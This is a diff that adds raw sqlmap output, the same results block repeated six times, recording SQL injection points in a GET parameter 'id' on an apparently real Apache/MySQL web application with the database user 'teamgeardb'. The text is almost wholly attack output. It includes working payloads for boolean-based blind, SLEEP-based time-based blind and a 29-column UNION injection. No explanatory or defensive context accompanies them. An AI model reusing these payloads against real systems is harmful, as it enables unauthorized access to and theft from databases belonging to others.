@@ -1,0 +1,126 @@
+sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2462=2462
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 29 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171786b71,0x4c636d6c736c526d5a54685676424d44654c425053786745674f6e72586b74496e644f7549594657,0x7178706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ROLy
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+current user is DBA:    False
+database management system users [1]:
+[*] 'teamgeardb'@'%'
+
